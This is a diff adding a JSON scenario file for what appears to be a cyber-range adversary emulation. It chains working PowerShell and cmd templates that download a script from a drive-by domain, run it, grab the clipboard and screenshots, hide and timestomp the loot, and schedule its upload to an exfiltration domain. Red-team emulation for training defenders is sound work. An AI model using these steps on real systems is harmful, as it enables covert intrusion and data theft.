@@ -1,0 +1,561 @@
+{
+    "meta_data": {
+        "name": "ttp_landgrab_2",
+        "version": "v1.0.1",
+        "title": "TTP Landgrab 2 scenario",
+        "description": "A SimSpace custom scenario with the intent of using less-visited TTPs.",
+        "author": "Attack Content",
+        "suggested_duration": 1425
+    },
+    "procedures": [
+        {
+            "tactic": "Actuator",
+            "technique": "Infrastructure",
+            "label": "actuator",
+            "preconditions": {
+                "tool": "self.tool_name"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX",
+            "preconditions": {
+                "self.tool_name": "self.tool",
+                "payload": "self.payload_name",
+                "exfiltration": "self.exfil",
+                "driveby": "self.driveby",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces2",
+            "preconditions": {
+                "driveby": "self.driveby2"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS2",
+            "preconditions": {
+                "driveby": "self.driveby2"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX2",
+            "preconditions": {
+                "payload": "about.js",
+                "driveby": "self.driveby2",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "PayloadCheapride",
+            "technique": "Infrastructure",
+            "label": "Payload",
+            "preconditions": {
+                "tool": "self.tool"
+            }
+        },
+        {
+            "tactic": "DriveByCompromise",
+            "technique": "InitialAccess",
+            "label": "driveByCompromise",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "UserExecution",
+            "technique": "Execution",
+            "label": "userExecution",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "WebProtocols",
+            "technique": "c2",
+            "label": "webProtocols_1",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "phishing": "self.phish_1",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1",
+                "tune": {
+                    "infra": true
+                }
+            }
+        },
+        {
+            "tactic": "IngressToolTransfer",
+            "technique": "c2",
+            "label": "fileDownload",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{invoke-webrequest http://",
+                            "self.driveby_domain2",
+                            "/",
+                            "self.tool_name2",
+                            " -O ",
+                            "self.temp_dir_name",
+                            "\\",
+                            "self.tool_name2",
+                            "; echo \" \"}"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "SystemNetworkConfigurationDiscovery",
+            "technique": "Discovery",
+            "label": "fileAndNetwork",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "cmd /c wscript ",
+                            "self.temp_dir_name",
+                            "\\",
+                            "self.tool_name2",
+                            " && echo \" \""
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "ClipboardData",
+            "technique": "Collection",
+            "label": "clipboardData",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell Get-Clipboard >> ",
+                            "self.temp_dir_name",
+                            "\\license.rtf; echo \" \""
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "HiddenFilesAndDirectories",
+            "technique": "DefenseEvasion",
+            "label": "hiddenFilesAndDirectories",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "cmd /c attrib +H ",
+                            "self.temp_dir_name",
+                            "\\license.rtf && echo \" \""
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "ScreenCapture",
+            "technique": "Collection",
+            "label": "screenCapture",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell $a = quser; $b = Out-String -inputobject $a; $c = $b.split(\"`n>\")[2].split()[0]; $d = \"",
+                            "self.temp_dir_name",
+                            "/~temp482\"; [void][reflection.assembly]::loadwithpartialname('system.windows.forms'); [system.windows.forms.sendkeys]::sendwait(\"{PRTSC}\"); $e = [System.Windows.Forms.Clipboard]::GetDataObject(); [System.Drawing.Bitmap]$e.getimage().Save($d, [System.Drawing.Imaging.ImageFormat]::Jpeg); echo \" \""
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "NtfsFileAttributes",
+            "technique": "DefenseEvasion",
+            "label": "ntfsFileAttributes",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell $data = [convert]::ToBase64String((Get-Content ",
+                            "self.temp_dir_name",
+                            "\\~temp482 -Encoding byte)); Set-Content ",
+                            "self.temp_dir_name",
+                            "\\license.rtf -Stream \"hidden\" -value $data; echo \" \""
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "TimeStomp",
+            "technique": "DefenseEvasion",
+            "label": "timeStomp",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$NewDate = (Get-Date '01/01/1969 01:01am'); $TSFile = gci -hidden ",
+                            "self.temp_dir_name",
+                            "\\license.rtf; $TSFile.LastWriteTime = $NewDate; $TSFile.CreationTime = $NewDate; $TSFile.LastAccessTime = $NewDate; echo \" \"}"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "ScheduledTransfer",
+            "technique": "Exfiltration",
+            "label": "exfiltrate",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell $time = [DateTime]::Now.AddMinutes(30); $hourMinute=$time.ToString(\"HH:mm\"); SchTasks.exe /Create /SC ONCE /TN \"WinUpdate\", /TR \"powershell Invoke-RestMethod -Uri http://",
+                            "self.exfil_domain",
+                            " -Method Post -InFile ",
+                            "self.temp_dir_name",
+                            "\\license.rtf\" /ST $hourMinute /F; echo \" \""
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "InternalDefacement",
+            "technique": "Impact",
+            "label": "internalDefacement",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "AgentExit",
+            "technique": "Utility",
+            "label": "AgentExit",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        }
+    ],
+    "iocs": {
+        "domain": [
+            "gogleimages.com",
+            "imagesgoogle.com",
+            "loaded.safeshop.net",
+            "shoptech.blog",
+            "shopstar.info",
+            "buy-inc-services.com",
+            "trp.realstarservice.com",
+            "go.cwbconsult.com",
+            "bizreviews.net",
+            "seoboss.info",
+            "seotech.com"
+        ],
+        "ip": [
+            "49.242.145.16/32",
+            "43.143.35.187/24",
+            "103.77.27.154/24",
+            "145.59.144.43/24",
+            "17.123.80.157/24",
+            "98.23.197.49/24",
+            "21.220.43.71/32",
+            "34.176.11.216/24",
+            "67.43.166.81/24",
+            "22.142.92.156/24",
+            "58.93.120.107/24",
+            "154.3.196.85/24"
+        ],
+        "binary": [
+            "msedge_update.exe",
+            "cahelperx86.exe",
+            "dde_dump.exe",
+            "yU32Cache.exe",
+            "TTsvc.exe",
+            "pyth0n10.exe",
+            "curl.exe",
+            "NTScanner32.exe",
+            "watson16.exe",
+            "snmptrap.exe",
+            "ROUTE.exe",
+            "robocpy.exe",
+            "rstreui.exe",
+            "run_once.exe"
+        ],
+        "temp_dir": [
+            "c:\\users\\public"
+        ]
+    },
+    "spec": {
+        "emaillist": "@('Janice Durham <janice.durham@site.com>', 'Darryl Richmond <darryl.richmond@site.com>', 'Nelda Rios <nelda.rios@site.com>', 'Joanna Wilkerson <joanna.wilkerson@site.com>')",
+        "tool": {
+            "1": {
+                "name": "cheapride_v1",
+                "beacon": "30",
+                "jitter": "90",
+                "ioc-ip_callback": "122.49.200.108/24",
+                "ioc-domain_callback": "inf0rm.bed1rcati.com",
+                "ioc-binary_payload_name": "form.doc.exe"
+            },
+            "2": {
+                "name": "about.js"
+            }
+        },
+        "chimera": {
+            "api-control_ip": "10.10.200.60"
+        },
+        "exfil": {
+            "1": {
+                "ioc-ip_exfil": "161.135.1.25/24",
+                "ioc-domain_exfil": "deepwaterhorizon.com"
+            }
+        },
+        "phishing": {
+            "1": {
+                "ioc-server_addr": "200.200.200.201",
+                "from_addr": "joanna.wilkerson@site.com",
+                "to_addrs": "Madelyn.Luna@site.com",
+                "cc": "",
+                "bcc": "",
+                "subject": "This monster is so scary!",
+                "body_subtype": "plain",
+                "attach": "",
+                "username": "joanna.wilkerson",
+                "password": "",
+                "port": "25"
+            }
+        },
+        "driveby": {
+            "1": {
+                "ioc-ip_driveby": "161.135.1.22/24",
+                "ioc-domain_driveby": "texaspumps.us"
+            },
+            "2": {
+                "ioc-ip_driveby": "123.35.79.48/24",
+                "ioc-domain_driveby": "foodtourusa.org"
+            }
+        },
+        "targets": {
+            "1": {
+                "payload_destination": "c:\\users\\Public",
+                "ioc-temp_dir": "c:\\users\\Public"
+            },
+            "2": {
+                "payload_destination": "C:\\PerfLogs"
+            }
+        }
+    },
+    "preconditions": {
+        "state": {},
+        "initial": {
+            "tool_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "name"
+                ]
+            },
+            "tool_name2": {
+                "path": [
+                    "tool",
+                    "2",
+                    "name"
+                ]
+            },
+            "payload_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "ioc-binary_payload_name"
+                ]
+            },
+            "tool": {
+                "path": [
+                    "tool",
+                    "1"
+                ]
+            },
+            "exfil": {
+                "path": [
+                    "exfil",
+                    "1"
+                ]
+            },
+            "driveby": {
+                "path": [
+                    "driveby",
+                    "1"
+                ]
+            },
+            "driveby2": {
+                "path": [
+                    "driveby",
+                    "2"
+                ]
+            },
+            "driveby_domain": {
+                "path": [
+                    "driveby",
+                    "1",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "driveby_domain2": {
+                "path": [
+                    "driveby",
+                    "2",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "chimera": {
+                "path": [
+                    "chimera"
+                ]
+            },
+            "phish_1": {
+                "path": [
+                    "phishing",
+                    "1"
+                ]
+            },
+            "target_1": {
+                "path": [
+                    "targets",
+                    "1"
+                ]
+            },
+            "target_1_elevated": {
+                "path": [
+                    "targets",
+                    "1"
+                ]
+            },
+            "target_2": {
+                "path": [
+                    "targets",
+                    "2"
+                ]
+            },
+            "temp_dir_name": {
+                "path": [
+                    "targets",
+                    "1",
+                    "ioc-temp_dir"
+                ]
+            },
+            "exfil_domain": {
+                "path": [
+                    "exfil",
+                    "1",
+                    "ioc-domain_exfil"
+                ]
+            }
+        },
+        "effects": {
+            "actuator": {
+                "path": [
+                    "actuator",
+                    "actuator",
+                    "ret",
+                    "registered_id"
+                ],
+                "default": 0
+            },
+            "scenario_infrastructure": {
+                "path": [
+                    "infrastructure"
+                ]
+            },
+            "agent_tgt1": {
+                "path": [
+                    "webProtocols_1",
+                    "agent",
+                    "ret",
+                    "agent_id"
+                ]
+            },
+            "agent_tgt1_elevated": {
+                "path": [
+                    "webProtocols_2",
+                    "agent",
+                    "ret",
+                    "agent_id"
+                ]
+            },
+            "agent_tgt2": {
+                "path": [
+                    "webProtocols_3",
+                    "agent",
+                    "ret",
+                    "agent_id"
+                ]
+            }
+        }
+    }
+}
